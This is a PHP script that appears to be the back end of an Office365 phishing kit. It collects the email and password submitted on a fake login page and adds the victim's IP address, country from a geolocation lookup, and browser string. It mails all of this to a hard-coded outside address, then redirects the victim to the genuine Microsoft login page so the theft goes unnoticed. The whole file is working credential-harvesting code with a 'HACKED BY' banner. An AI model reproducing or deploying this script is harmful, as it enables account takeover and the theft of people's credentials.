<?php
session_start();
$_SESSION['Pdf3'] = $_POST['pdf3'];
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['email'];
$passwd = $_POST['password'];
$own = 'j.1u1s@yandex.ru';
$server = date("D/M/d, Y g:i a"); 
$sender = 'Drive@Pat-Office.com';
$domain = 'Office365 **Welcome Log** Matthew Pat** ';
$subj = "$domain Users $country";
$headers .= "From: Off-Mail<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'https://login.microsoftonline.com/common/oauth2';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>________MR PAT CYBER TEAM_________</td></tr>
 <tr><td><STRONG>EMail I.D: $login<td/></tr>
 <tr><td><STRONG>Password: $passwd</td></tr>
 <tr><td><STRONG>IP: $ip</td></tr>
 <tr><td><STRONG>Date: $server</td></tr>
 <tr><td><STRONG>country : $country</td></tr>
 <tr><td>Browser : $browserAgent</td></tr>
 <tr><td>_____HACKED BY MR MATTHEW PAT (SKYPE =MR MATTHEW PAT)_____</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: https://login.microsoftonline.com/common/oauth2" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: $over");
}
?>
